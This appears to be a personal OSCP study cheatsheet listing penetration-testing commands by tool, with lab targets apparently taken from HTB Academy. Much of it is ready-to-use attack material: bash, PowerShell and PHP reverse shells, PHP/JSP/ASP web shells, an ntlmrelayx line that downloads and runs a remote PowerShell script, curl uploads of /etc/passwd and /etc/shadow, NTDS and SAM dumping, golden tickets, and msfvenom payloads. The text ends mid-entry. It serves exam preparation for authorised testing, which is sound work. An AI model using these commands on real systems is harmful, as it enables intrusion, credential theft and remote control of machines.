# OSCP Cheatsheet — Organized

> This CheatSheet have two section:
> - **Part 1 - Tools**: commands grouped by tool
> - **Part 2 - Techniques and Procedures**: methodologies, attack flows and strategies

---

# PART 1 — TOOLS

## Tools Index

- [Amass](#amass)
- [Arp-scan](#arp-scan)
- [BloodHound & Neo4j](#bloodhound--neo4j)
- [Braa](#braa)
- [CeWL](#cewl)
- [Chisel](#chisel)
- [CrackMapExec / NetExec](#crackmapexec--netexec)
- [Curl](#curl)
- [Dig](#dig)
- [Dnsenum](#dnsenum)
- [Enum4linux-ng](#enum4linux-ng)
- [Evil-WinRM](#evil-winrm)
- [Ffuf](#ffuf)
- [Fping](#fping)
- [GoBuster](#gobuster)
- [Hashcat](#hashcat)
- [Impacket Suite](#impacket-suite)
- [John The Ripper](#john-the-ripper)
- [Kerbrute](#kerbrute)
- [Ldapsearch](#ldapsearch)
- [Ldapdomaindump](#ldapdomaindump)
- [Ligolo-ng](#ligolo-ng)
- [Metasploit](#metasploit)
- [Msfvenom](#msfvenom)
- [MySQL Client](#mysql-client)
- [Netcat & Ncat](#netcat--ncat)
- [Nikto](#nikto)
- [Nmap](#nmap)
- [ODAT (Oracle)](#odat-oracle)
- [Onesixtyone](#onesixtyone)
- [OpenSSL](#openssl)
- [Proxychains](#proxychains)
- [RDP Clients](#rdp-clients)
- [Responder / Inveigh](#responder--inveigh)
- [Rpcclient](#rpcclient)
- [Rsync](#rsync)
- [Shells](#shells)
- [Smbclient](#smbclient)
- [Smbmap](#smbmap)
- [Smtp-user-enum](#smtp-user-enum)
- [Snmpwalk](#snmpwalk)
- [Socat](#socat)
- [SQLplus (Oracle)](#sqlplus-oracle)
- [SSH](#ssh)
- [Sshuttle](#sshuttle)
- [Subfinder](#subfinder)
- [Wafw00f](#wafw00f)
- [Whatweb](#whatweb)
- [Wireshark & Tcpdump](#wireshark--tcpdump)
- [File Transfer Methods](#file-transfer-methods)
- [Windows Port Forwarding](#windows-port-forwarding)
- [System Commands](#system-commands)
- [ActiveDirectory PowerShell Module](#activedirectory-powershell-module)
- [SharpView](#sharpview)
- [Snaffler](#snaffler)

---

## Amass

```bash
amass enum -passive -d ingenero.es
```

---

## Arp-scan

```bash
sudo arp-scan -I tun0 --localnet
```

---

## BloodHound & Neo4j

Switch Java to version 11 if there are issues:
```bash
update-alternatives --config java
```

Start services:
```bash
neo4j console
bloodhound &>/dev/null &
disown
```

Data collection with SharpHound (from Windows):
```powershell
Import-Module .\SharpHound.ps1
cat SharpHound.ps1 | grep function
Invoke-BloodHound -CollectionMethod All
```

SharpHound.exe:
```powershell
.\SharpHound.exe --help
.\SharpHound.exe -c All --zipfilename ILFREIGHT
```

Data collection with bloodhound-python (from Linux):
```bash
sudo bloodhound-python -u 'forend' -p 'Klmcargo2' -ns 172.16.5.5 -d inlanefreight.local -c all
zip -r ilfreight_bh.zip *.json
```

Download ZIP in evil-winrm session:
```
download "C:/Windows/Temp/test/20250701170038_BloodHound.zip" bloodhound.zip
```

Upload ZIP to BloodHound GUI:

![Pasted image 20260726170043.png](images/Pasted%20image%2020260726170043.png)

Default credentials:
- Legacy BloodHound: `neo4j / neo4j`
- BloodHound CE: `admin / randomly_generated_password` (check logs on first run)

### Search in BloodHound

In the search bar on the top left type `domain:` and select the domain.

Pre-built queries (Analysis tab):
- `Find Shortest Paths To Domain Admins` — logical paths to escalate to Domain Admin
- `Find Computers with Unsupported Operating Systems` — outdated/legacy hosts
- `Find Computers where Domain Users are Local Admin` — hosts where all users have local admin
- `Database Info` tab → search for a node (e.g. `Domain Users`) → explore `Node Info`

Custom queries via `Raw Query` box. Cheatsheet: https://hausec.com/2019/09/09/bloodhound-cypher-cheatsheet/

---

## Braa

Brute-force SNMP OIDs with a known community string:
```bash
braa <community_string>@<IP>:.1.3.6.*
braa public@10.129.14.128:.1.3.6.*
```

---

## CeWL

Generate wordlist from a corporate website:
```bash
cewl https://www.inlanefreight.com -d 4 -m 6 --lowercase -w inlane.wordlist
```

---

## Chisel

Build (requires Go):
```bash
git clone https://github.com/jpillora/chisel.git
cd chisel && go build
```

Transfer to pivot:
```bash
scp chisel ubuntu@10.129.202.64:~/
```

Direct mode (server on victim):
```bash
# On pivot (victim)
./chisel server -v -p 1234 --socks5

# On attacker
./chisel client -v 10.10.14.17:1234 R:socks
```

Reverse pivot (to bypass firewall):
```bash
# On attacker
sudo ./chisel server --reverse -v -p 1234 --socks5

# On victim
./chisel client -v 10.10.14.17:1234 R:socks
```

Configure proxychains after starting chisel:
```
socks5 127.0.0.1 1080
```

---

## CrackMapExec / NetExec

Basic host info:
```bash
crackmapexec smb 10.10.10.10
```

Verify credentials:
```bash
crackmapexec smb 10.10.10.10 -u 'user' -p 'password'
```

List shares:
```bash
crackmapexec smb 10.10.10.10 -u 'user' -p 'password' --shares
```

Scan network:
```bash
crackmapexec smb 10.10.10.10/24
```

Domain users:
```bash
crackmapexec smb 10.10.10.10 -u 'user' -p 'password' --users
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --users
```

Groups:
```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups
```

Logged-on users:
```bash
crackmapexec smb 172.16.5.130 -u forend -p Klmcargo2 --loggedon-users
```

Spider shares:
```bash
crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 -M spider_plus --share 'Department Shares'
```

Enable RDP:
```bash
crackmapexec smb 10.10.10.0/24 -u 'Administrator' -p 'password' -M rdp -o action=enable
```

Dump NTDS (DC admin):
```bash
crackmapexec smb 10.10.10.10 -u 'Administrator' -p 'password' --ntds vss
```

Dump SAM:
```bash
crackmapexec smb 10.10.10.10 -u 'user' -p 'pass' -d 'domain.local' --sam
```

Brute force:
```bash
crackmapexec smb 10.10.10.10 -u 'bob' -p /usr/share/wordlist/rockyou.txt
```

Local authentication:
```bash
netexec smb 10.129.35.14 -u 'bob' -p 'Welcome1' --shares --local-auth
```

Kerberos authentication:
```bash
crackmapexec smb 10.10.10.175 -u 'fsmith' -p '' -d EGOTISTICALBANK --kerberos
```

Password spraying:
```bash
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H <hash> | grep +
```

Password policy:
```bash
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
```

WinRM:
```bash
netexec winrm 10.10.10.175 -u 'user' -p 'password'
```

---

## Curl

HTTP banner:
```bash
curl -I inlanefreight.com
curl -IL https://www.inlanefreight.com
```

IMAP:
```bash
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd
curl -k 'imaps://10.129.14.128' --user user:p4ssw0rd -v
```

Upload file:
```bash
curl -X POST https://192.168.49.128/upload -F 'files=@/etc/passwd' -F 'files=@/etc/shadow' --insecure
curl -T /etc/passwd http://localhost:9001/SecretUploadDirectory/users.txt
```

Web shell:
```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
```

Fileless attack:
```bash
curl https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh | bash
```

Subdomains via crt.sh:
```bash
curl -s https://crt.sh/\?q\=inlanefreight.com\&output\=json | jq . | grep name | cut -d":" -f2 | grep -v "CN=" | cut -d'"' -f2 | awk '{gsub(/\\n/,"\n");}1;' | sort -u
```

---

## Dig

Generic query:
```bash
dig any inlanefreight.com
dig @10.10.10.224 realcorp.htb
dig @10.10.10.224 realcorp.htb ns
dig @10.10.10.224 realcorp.htb mx
```

SOA, NS, TXT:
```bash
dig soa www.sergiky.github.io
dig ns inlanefreight.htb @10.129.14.128
dig CH TXT version.bind 10.129.120.85
```

Zone transfer:
```bash
dig axfr inlanefreight.htb @10.129.14.128
dig axfr internal.inlanefreight.htb @10.129.56.224
dig axfr @nsztm1.digi.ninja zonetransfer.me
```

Reverse lookup:
```bash
dig -x 134.209.24.248
```

Subdomain brute force:
```bash
for sub in $(cat /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt);do dig $sub.inlanefreight.htb @10.129.14.128 | grep -v ';\|SOA' | sed -r '/^\s*$/d' | grep $sub | tee -a subdomains.txt;done
```

---

## Dnsenum

```bash
dnsenum --enum inlanefreight.com -f /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r
dnsenum --dnsserver 10.129.14.128 --enum -p 0 -s 0 -o subdomains.txt -f /opt/useful/seclists/Discovery/DNS/subdomains-top1million-110000.txt inlanefreight.htb
```

---

## Enum4linux-ng

Full enumeration:
```bash
enum4linux-ng 10.10.10.10
```

Password policy only:
```bash
enum4linux -P 172.16.5.5
enum4linux-ng -P 172.16.5.5 -oA ilfreight
```

Users only:
```bash
enum4linux -U 172.16.5.5 | grep "user:" | cut -f2 -d"[" | cut -f1 -d"]"
```

---

## Evil-WinRM

```bash
evil-winrm -u 'user' -p 'password'
evil-winrm -i 192.168.1.100 -u Administrator -p 'Password!'
```

With Docker:
```bash
docker run --rm -ti --name evil-winrm -v /home/foo/ps1_scripts:/ps1_scripts -v /home/foo/exe_files:/exe_files -v /home/foo/data:/data oscarakaelvis/evil-winrm -i 192.168.1.100 -u Administrator -p 'MySuperSecr3tPass123!' -s '/ps1_scripts/' -e '/exe_files/'
```

Python version:
```bash
pipx install evil-winrm-py
```

---

## Ffuf

Subdomains via vhost fuzzing:
```bash
ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -u http://siteisup.htb -H "Host: FUZZ.siteisup.htb" | grep -vE "Words: 186"
```

---

## Fping

```bash
fping -asgq 172.16.5.0/23
```
Flags: `-a` (alive hosts), `-s` (stats), `-g` (generate list from CIDR), `-q` (no per-host output)

---

## GoBuster

Directories:
```bash
gobuster dir -u https://10.10.10.10/ -w /usr/share/wordlist/seclists/Discovery/Web-Content/common.txt
```

Virtual hosting:
```bash
gobuster vhost -u http://<target_IP> -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt --append-domain
gobuster vhost -u http://inlanefreight.htb:1234 -w ...
gobuster vhost -u http://siteisup.htb/ -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-5000.txt -t 20 --append-domain
```

DNS:
```bash
gobuster dns -d 154.57.164.62:32148 -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt
```

Useful flags: `-t` (threads), `-k` (ignore SSL), `-o` (output to file)

---

## Hashcat

General syntax:
```bash
hashcat -a <mode> -m <hash_type> <hashes> [wordlist/mask/...]
```

Identify hash type:
```bash
hashid -m '$1$FNr44XZC$wQxY6HHLrgrGX0e1195k.1'
hashid -j 193069ceb0461e1d40d216e32c79c704
```

Dictionary attack (`-a 0`):
```bash
hashcat -a 0 -m 0 e3e3ec5831ad5e7288241960e5d4fdb8 /usr/share/wordlists/rockyou.txt
hashcat -a 0 -m 0 <hash> /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

Mask attack (`-a 3`):
```bash
hashcat -a 3 -m 0 1e293d6912d074c0fd15844d803400dd '?u?l?l?l?l?d?s'
```

| Mask | Charset |
|------|---------|
| `?l` | abcdefghijklmnopqrstuvwxyz |
| `?u` | ABCDEFGHIJKLMNOPQRSTUVWXYZ |
| `?d` | 0123456789 |
| `?h` | 0123456789abcdef |
| `?H` | 0123456789ABCDEF |
| `?s` | special characters |
| `?a` | ?l?u?d?s |
| `?b` | 0x00 - 0xff |

IPMI hashes (mode 7300):
```bash
hashcat -m 7300 ipmi.txt -a 3 ?1?1?1?1?1?1?1?1 -1 ?d?u
```

Generate mutated wordlist with custom rules:
```bash
hashcat --force password.list -r custom.rule --stdout | sort -u > mut_password.list
```

Rules location: `/usr/share/hashcat/rules`

---

## Impacket Suite

### psexec
```bash
impacket-psexec domain.htb/user:password@10.10.10.10 cmd.exe
```

### wmiexec
```bash
impacket-wmiexec.py domain.local/user@IP -hashes <hash>
/usr/share/doc/python3-impacket/examples/wmiexec.py Cry0l1t3:"P455w0rD!"@10.129.201.248 "hostname"
```

### smbserver (SMB server on attacker)
```bash
impacket-smbserver smbFolder $(pwd) -smb2support
impacket-smbserver share -smb2support /tmp/smbshare
impacket-smbserver share -smb2support /tmp/smbshare -user test -password test
```

### mssqlclient
```bash
python3 mssqlclient.py Administrator@10.129.201.248 -windows-auth
```

### samrdump
```bash
samrdump.py 10.129.14.128
```

### GetNPUsers (AS-REP Roasting)
```bash
impacket-GetNPUsers domain.htb/ -no-pass -usersfile users.txt
```

### GetUserSPNs (Kerberoasting)
```bash
impacket-GetUserSPNs domain.htb/user:password
impacket-GetUserSPNs domain.htb/user:password -request
```

### ticketer (Golden Ticket)
```bash
impacket-ticketer -nthash <hash_krbtgt> -domain-sid S-1-5... -domain domain.local Administrator
export KRB5CCNAME="/home/sergiky/Desktop/AD/GoldenTicket/Administrator.ccache"
psexec.py -n -k domain.local/Administrator@<DC-hostname> cmd.exe
```

### ntlmrelayx
```bash
ntlmrelayx.py -tf targets.txt -smb2support
ntlmrelayx.py -6 -wh 10.10.10.10 -t smb://10.10.10.15 -socks -debug -smb2support
ntlmrelayx.py -tf targets.txt -smb2support -c "powershell IEX(New-Object Net.WebClient).downloadString('http://10.10.10.10/revshell.ps1')"
```

---

## John The Ripper

Single crack mode (by username):
```bash
john --single passwd
```

With wordlist:
```bash
john --wordlist=<wordlist> <hash_file>
john --wordlist=rockyou.txt hashes
```

Specify format:
```bash
john --format=zip [...] <hash_file>
```

File-to-John converters:

| Tool | Description |
|------|-------------|
| `pdf2john` | Password-protected PDFs |
| `ssh2john` | SSH private keys |
| `rar2john` | RAR archives |
| `keepass2john` | KeePass databases |
| `zip2john` | ZIP archives |
| `office2john` | MS Office documents |
| `pfx2john` | PKCS#12 files |
| `hccap2john` | WPA/WPA2 captures |

Find converters:
```bash
locate *2john*
```

---

## Kerbrute

Download: https://github.com/ropnop/kerbrute/releases/latest

Build:
```bash
git clone https://github.com/ropnop/kerbrute.git && make all
```

Enumerate valid users:
```bash
kerbrute userenum --dc 10.10.10.10 -d domain.htb /usr/share/wordlists/seclists/Usernames/Names/names.txt -o valid_ad_users
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

Password spraying:
```bash
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt Welcome1
```

---

## Ldapsearch

Naming contexts:
```bash
ldapsearch -x -H ldap://10.10.10.175 -s base namingcontexts
```

Dump full domain:
```bash
ldapsearch -x -H ldap://10.10.10.175 -b 'DC=EGOTISTICAL-BANK,DC=LOCAL'
```

Password policy (anonymous bind):
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength
```

Users (anonymous bind):
```bash
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "(&(objectclass=user))" | grep sAMAccountName: | cut -f2 -d" "
```

---

## Ldapdomaindump

Requires valid credentials:
```bash
service apache2 start
python3 ldapdomaindump -u 'domain.local\user' -p 'password' 10.10.10.10
```

---

## Ligolo-ng

Recommended for OSCP (faster than pure proxychains).

> Shares a port with BloodHound — change if necessary.
> With nmap use `--unprivileged` or `-PE` to avoid false positives.

---

## Metasploit

Launch:
```bash
msfconsole
msfconsole -q
```

Search:
```bash
search type:exploit platform:windows cve:2021 rank:excellent microsoft
```

Basic commands:
```
use <module>
options
info
set RHOSTS x
setg RHOSTS x
run / exploit
show targets
show payloads
show encoders
```

### Database
```bash
sudo systemctl start postgresql
sudo msfdb init
sudo msfdb status
```

Inside msfconsole:
```bash
workspace -a Target_1
db_import Target.xml
db_nmap -sV -sS 10.10.10.8
hosts -h
services -h
creds -h
loot -h
```

### Sessions
```bash
sessions           # list
sessions -i 1      # use
sessions -u 1      # upgrade to meterpreter
Ctrl+Z             # background
```

### Jobs
```bash
exploit -j          # run in background
jobs -h
kill <index>
```

### Meterpreter
```bash
getuid
ps
steal_token <PID>
hashdump
lsa_dump_sam
lsa_dump_secrets
db_nmap -sV -p- -T5 -A 10.10.10.15
```

Find privilege escalation exploits:
```bash
use post/multi/recon/local_exploit_suggester
```

Ping sweep from meterpreter:
```bash
run post/multi/gather/ping_sweep RHOSTS=172.16.5.0/23
```

Autoroute (pivoting):
```bash
run autoroute -s 172.16.5.0/23
run autoroute -p
```

SOCKS proxy:
```bash
use auxiliary/server/socks_proxy
set SRVPORT 9050
set SRVHOST 0.0.0.0
set version 4a
run
```

Portfwd:
```bash
portfwd add -l 3300 -p 3389 -r 172.16.5.19
portfwd add -R -l 8081 -p 1234 -L 10.10.14.18
```

IPMI:
```bash
use auxiliary/scanner/ipmi/ipmi_version
use auxiliary/scanner/ipmi/ipmi_dumphashes
```

MSSQL:
```bash
use auxiliary/scanner/mssql/mssql_ping
```

### Useful Plugins

- **Railgun**: call Windows API functions directly from Meterpreter
- **Darkoperator's** collection: https://github.com/darkoperator/Metasploit-Plugins
- **WADComs** (interactive cheatsheet for AD/Windows): https://wadcoms.github.io/

---

## Msfvenom

Reverse HTTPS (Windows x64):
```bash
msfvenom -p windows/x64/meterpreter/reverse_https lhost=<IP> -f exe -o backupscript.exe LPORT=8080
```

Reverse TCP (Windows x64):
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.5.129 -f exe -o backupscript.exe LPORT=1234
```

Bind shell:
```bash
msfvenom -p windows/x64/meterpreter/bind_tcp -f exe -o backupjob.exe LPORT=8443
```

Generic x86:
```bash
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl
msfvenom -a x86 --platform windows -p windows/shell/reverse_tcp LHOST=127.0.0.1 LPORT=4444 -b "\x00" -f perl -e x86/shikata_ga_nai
```

Check payload against AV:
```bash
msf-virustotal -k <API_key> -f payload.exe
```

---

## MySQL Client

```bash
mysql -u root -h 10.129.14.132
mysql -u root -pP4SSw0rd -h 10.129.14.12
```

Nmap scripts:
```bash
sudo nmap 10.129.14.128 -sV -sC -p3306 --script mysql*
```

Useful commands:

| Command | Description |
|---------|-------------|
| `show databases;` | List databases |
| `use <database>;` | Select DB |
| `show tables;` | List tables |
| `show columns from <table>;` | View columns |
| `select * from <table>;` | Everything from a table |

System connections (lateral movement):
```mysql
use sys;
select host, unique_users from host_summary;
```

---

## Netcat & Ncat

Listener:
```bash
nc -nlvp 443
rlwrap nc -nlvp 4646
```

Banner grabbing:
```bash
nc -nv 10.129.42.253 21
```

File transfer:
```bash
# Receiver
nc -l -p 8000 > SharpKatz.exe
ncat -l -p 8000 --recv-only > SharpKatz.exe

# Sender
nc -q 0 192.168.49.128 8000 < SharpKatz.exe
ncat --send-only 192.168.49.128 8000 < SharpKatz.exe

# Attacker as server
sudo nc -l -p 443 -q 0 < SharpKatz.exe
# Victim downloads
nc 192.168.49.128 443 > SharpKatz.exe
cat < /dev/tcp/192.168.49.128/443 > SharpKatz.exe
```

---

## Nikto

```bash
nikto -h inlanefreight.com -Tuning b
```

---

## Nmap

### Basic Scans

SYN scan (stealth):
```bash
sudo nmap -p- --open -sS -T4 --min-rate 4500 -vvv -n -Pn -oG allPorts
```

TCP connect:
```bash
sudo nmap 10.129.2.28 -p 443 --packet-trace --disable-arp-ping -Pn -n --reason -sT
```

UDP:
```bash
sudo nmap -sU -T5 -Pn -n -F 10.129.2.32
```

Scripts + versions:
```bash
sudo nmap -p80,443,445,3309 -sCV 10.129.2.32 -oN targeted
```

### Host Discovery
```bash
sudo nmap 10.129.2.0/24 -sn -oA tnet | grep for | cut -d" " -f5
sudo nmap -sn -oA tnet 10.129.2.18 10.129.2.19 10.129.2.20 | grep for | cut -d" " -f5
sudo nmap -v -A -iL hosts.txt -oN /home/htb-student/Documents/host-enum
```

### Scripts by Service

SMB:
```bash
nmap --script smb-os-discovery.nse -p445 10.10.10.40
sudo nmap 192.168.10.243 -p445 -sV -sS -O --script 'vuln'
nmap -Pn -p445 --open --max-hostgroup 3 --script smb-vuln-ms17-010
```

SMTP:
```bash
sudo nmap 10.129.14.128 -sC -sV -p25
sudo nmap 10.129.14.128 -p25 --script smtp-open-relay -v
```

RDP:
```bash
nmap -sV -sC 10.129.201.248 -p3389 --script rdp*
```

WinRM:
```bash
nmap -sV -sC 10.129.201.248 -p5985,5986 --disable-arp-ping -n
```

IPMI:
```bash
sudo nmap -sU --script ipmi-version -p 623
```

Oracle TNS:
```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

MSSQL:
```bash
sudo nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 10.129.201.248
```

HTTP enum:
```bash
nmap --script http-enum 10.10.10.10
nmap --script http-enum --script-args http-enum.basepath='/dev/'
```

Banner:
```bash
nmap -sV --script=banner -p21 10.10.10.0/24
```

### IDS/IPS Evasion

ACK scan:
```bash
nmap -sA <target>
```

Decoys:
```bash
sudo nmap 10.129.2.28 -p 80 -sS -Pn -n --disable-arp-ping --packet-trace -D RND:5
```

Specific source IP:
```bash
sudo nmap 10.129.2.28 -n -Pn -p 445 -O -S 10.129.2.200 -e tun0
```

Source port 53 (DNS proxying):
```bash
sudo nmap 10.129.2.28 -p50000 -sS -Pn -n --disable-arp-ping --packet-trace --source-port 53
ncat -nv --source-port 53 10.129.2.28 50000
sudo nmap -n -sV -p50000 10.129.50.64 -Pn --source-port 53 -f -T1 -D RND:5
```

Scripts location: `/usr/share/nmap/scripts/`
Categories: auth, brute, default, discovery, dos, exploit, fuzzer, intrusive, malware, safe, version, vuln

---

## ODAT (Oracle)

Installation:
```bash
git clone https://github.com/quentinhardy/odat.git
cd odat/
pip install python-libnmap
git submodule init && git submodule update
sudo pip3 install colorlog termcolor passlib python-libnmap pycryptodome openpyxl
```

Usage:
```bash
./odat.py -h
./odat.py all -s 10.129.204.235
./odat.py utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

---

## Onesixtyone

Brute force SNMP community strings:
```bash
onesixtyone -c /opt/useful/seclists/Discovery/SNMP/snmp.txt 10.129.14.128
onesixtyone -c dict.txt 10.129.42.254
```

---

## OpenSSL

FTP with TLS:
```bash
openssl s_client -connect 10.129.14.136:21 -starttls ftp
```

POP3/IMAP with TLS:
```bash
openssl s_client -connect 10.129.14.128:pop3s
openssl s_client -connect 10.129.14.128:imaps
```

Encrypt files:
```bash
openssl enc -aes256 -iter 100000 -pbkdf2 -in /etc/passwd -out passwd.enc
openssl enc -d -aes256 -iter 100000 -pbkdf2 -in passwd.enc -out passwd
```

Self-signed certificate:
```bash
openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'
```

---

## Proxychains

Configure `/etc/proxychains.conf`:
```
socks4  127.0.0.1 9050
socks5  127.0.0.1 1080
```

Usage:
```bash
proxychains nmap -v -sn 172.16.5.1-200
proxychains nmap -v -Pn -sT 172.16.5.19
proxychains msfconsole
proxychains xfreerdp /v:172.16.5.19 /u:victor /p:pass@123
proxychains rdesktop -u victor -p "pass@123" 172.16.5.19 -d INLANEFREIGHT.LOCAL
proxychains firefox-esr 172.16.5.135:80
```

---

## RDP Clients

### xfreerdp
```bash
xfreerdp /u:cry0l1t3 /p:"P455w0rd!" /v:10.129.201.248
xfreerdp /v:10.10.10.132 /d:HTB /u:administrator /p:'Password0@' /drive:linux,/home/plaintext/htb/academy/filetransfer
```

To access the directory, we can connect to `\\tsclient\`, allowing us to transfer file to and from the RDP session. You can use the Network tab in the explorer file.

![Pasted image 20260623191726](images/Pasted%20image%2020260623191726.png)

An alternative for Windows is use mstsc.exe remote desktop client.
Local Resources > Local devices and resources, more > Drives

![Pasted image 20260623191829](images/Pasted%20image%2020260623191829.png)

### rdesktop
```bash
rdesktop -u htb-student -p HTB_@cademy_stdnt! 10.129.34.4
rdesktop 10.10.10.132 -d HTB -u administrator -p 'Password0@' -r disk:linux='/home/user/rdesktop/files'
```

### rdp-sec-check
```bash
sudo cpan
install Encoding::BER
git clone https://github.com/CiscoCXSecurity/rdp-sec-check.git && cd rdp-sec-check
./rdp-sec-check.pl 10.129.201.248
```

---

## Responder / Inveigh

### Responder

```bash
sudo responder -I ens224
sudo responder -I ens224 -A      # passive/analyze mode
```

Flags: `-A` (analyze), `-wf` (WPAD proxy), `-f` (OS fingerprint), `-v` (verbose), `-w` (built-in WPAD)

Logs at: `/usr/share/responder/logs` — format `(MODULE)-(HASH_TYPE)-(CLIENT_IP).txt`

Ports that must be free:
```
UDP 137, 138, 53, 389 / TCP 1433, 1434, 80, 135, 139, 445, 21, 3141, 25, 110, 587, 3128 / Multicast UDP 5355, 5353
```

### Inveigh (Windows)

PowerShell:
```powershell
Import-Module .\Inveigh.ps1
Invoke-Inveigh Y -NBNS Y -ConsoleOutput Y -FileOutput Y
```

C#:
```
.\Inveigh.exe
GET NTLMV2UNIQUE
GET NTLMV2USERNAMES
```

---

## Rpcclient

Anonymous connection:
```bash
rpcclient -U "" 10.10.10.10 -N
rpcclient -U "" -N 172.16.5.5
```

With credentials:
```bash
rpcclient -U "user%password" 10.10.10.10
rpcclient -U "domain.local\user%password" 10.10.10.10
```

Single command:
```bash
rpcclient -U "user%pass" 10.10.10.10 -c 'enumdomusers'
```

Internal commands:
```
enumdomusers          # domain users
enumdomgroups         # groups
querygroupmem 0x200   # group members (RID)
queryuser 0x1f4       # user info by RID
querydispinfo         # all user descriptions
querydominfo          # domain info
getdompwinfo          # password policy
```

User descriptions in a loop:
```bash
for rid in $(rpcclient -U "domain.local\user%password" 10.10.10.10 -c 'enumdomusers' | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]'); do echo -e "\n[+] RID $rid:"; rpcclient -U "domain.local\user%password" 10.10.10.10 -c "queryuser $rid" | grep -E -i "user name|description"; done
```

RID brute force:
```bash
for i in $(seq 500 1100);do rpcclient -N -U "" 10.129.14.128 -c "queryuser 0x$(printf '%x\n' $i)" | grep "User Name\|user_rid\|group_rid" && echo ""; done
```

Password spraying:
```bash
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
```

Null session (Windows):
```cmd
net use \\DC01\ipc$ "" /u:""
```

---

## Rsync

```bash
sudo nmap -sV -p 873 127.0.0.1
nc -nv 127.0.0.1 873
rsync -av --list-only rsync://127.0.0.1/dev
rsync -av rsync://127.0.0.1/dev
rsync -av -e ssh rsync://127.0.0.1/dev
rsync -av -e "ssh -p2222" rsync://127.0.0.1/dev
```

---

## Shells

### Reverse Shell

Bash:
```bash
bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.10.10 1234 >/tmp/f
```

PHP:
```php
<?php system("bash -c 'bash -i >& /dev/tcp/10.10.10.10/1234 0>&1'"); ?>
```

PowerShell:
```powershell
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.10.10',1234);$s = $client.GetStream();[byte[]]$b = 0..65535|%{0};while(($i = $s.Read($b, 0, $b.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);$sb = (iex $data 2>&1 | Out-String );$sb2 = $sb + 'PS ' + (pwd).Path + '> ';$sbt = ([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sbt,0,$sbt.Length);$s.Flush()};$client.Close()"
```

Listener:
```bash
nc -nlvp 443
rlwrap nc -nlvp 4646
```

Resources: https://www.revshells.com/ | https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

### Bind Shell

Bash (victim):
```bash
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc -lvp 1234 >/tmp/f
```

Connect from attacker:
```bash
nc 10.10.10.1 1234
```

### Web Shell

PHP:
```php
<?php system($_REQUEST["cmd"]); ?>
```

JSP:
```jsp
<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>
```

ASP:
```asp
<% eval request("cmd") %>
```

Execute:
```bash
curl http://SERVER_IP:PORT/shell.php?cmd=id
echo '<?php system($_REQUEST["cmd"]); ?>' > /var/www/html/shell.php
```

### Upgrading TTY

```bash
script /dev/null -c bash
# or
python -c 'import pty; pty.spawn("/bin/bash")'
```

`Ctrl+Z` → then:
```bash
stty raw -echo; fg
reset xterm
export TERM=xterm
stty size                         # get your terminal dimensions
stty rows 67 columns 318          # apply on remote shell
```

---

## Smbclient

Null session:
```bash
smbclient -L 10.10.10.10 -N
```

Connect to share:
```bash
smbclient \\\\10.129.42.253\\users                  # guest
smbclient -U bob \\\\10.129.42.253\\users           # with credentials
```

Recursive download:
```bash
smbclient //<target>/<share> -U <user> -c 'recurse ON; prompt OFF; mget *'
```

Download everything with wget:
```bash
wget -m --no-passive ftp://anonymous:anonymous@10.129.14.136
```

Commands: `cd`, `ls`, `get`, `put`

---

## Smbmap

View permissions:
```bash
smbmap -H 10.10.10.10
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5
```

Recursive:
```bash
smbmap -H 10.10.10.10 -r shared_folder/folder2
smbmap -u forend -p Klmcargo2 -d INLANEFREIGHT.LOCAL -H 172.16.5.5 -R 'Department Shares' --dir-only
```

Download:
```bash
smbmap -H 10.10.10.10 --download file
```

---

## Smtp-user-enum

```bash
smtp-user-enum -M VRFY -U users.txt -t 10.129.6.156
